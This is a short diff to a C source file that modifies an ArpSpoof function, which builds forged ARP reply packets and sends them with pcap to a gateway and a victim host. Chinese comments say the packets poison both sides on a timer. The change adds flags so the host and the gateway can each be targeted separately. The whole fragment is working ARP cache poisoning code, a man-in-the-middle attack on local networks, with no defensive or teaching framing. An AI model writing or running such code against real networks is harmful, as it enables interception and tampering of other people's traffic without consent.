@@ -420,7 +420,8 @@ int ArpSpoof(
 
 int ArpSpoof(
 			 char * pszInterfaceName, char * pszGatewayIp, char * pszGatewayMac,
-			 char * pszHostIp, char * pszHostMac, char * pszLocalMac
+			 char * pszHostIp, char * pszHostMac, char * pszLocalMac,
+			 bool bGateway, bool bHost
 			 )
 {
 	int nRet = 0;
@@ -446,16 +447,21 @@ int ArpSpoof(
 	//向网关和主机分别定时发送欺骗包
 	//while(1)
 	{
-		BuildArpReply(&packet, pszLocalMac, pszHostMac, pszGatewayIp, pszHostIp);
-		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
+		if(bHost)
 		{
-			LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
+			BuildArpReply(&packet, pszLocalMac, pszHostMac, pszGatewayIp, pszHostIp);
+			if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
+			{
+				LOG_DEBUG("pcap_sendpacket send arp spoof to host error.\n");
+			}
 		}
-
-		BuildArpReply(&packet, pszLocalMac, pszGatewayMac, pszHostIp, pszGatewayIp);
-		if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
+		if(bGateway)
 		{
-			LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
+			BuildArpReply(&packet, pszLocalMac, pszGatewayMac, pszHostIp, pszGatewayIp);
+			if(pcap_sendpacket(pHandler, (const u_char * )&packet, 60) == -1)
+			{
+				LOG_DEBUG("pcap_sendpacket send arp spoof to gateway error.\n");
+			}
 		}
 	} // 结束 while(1)
 
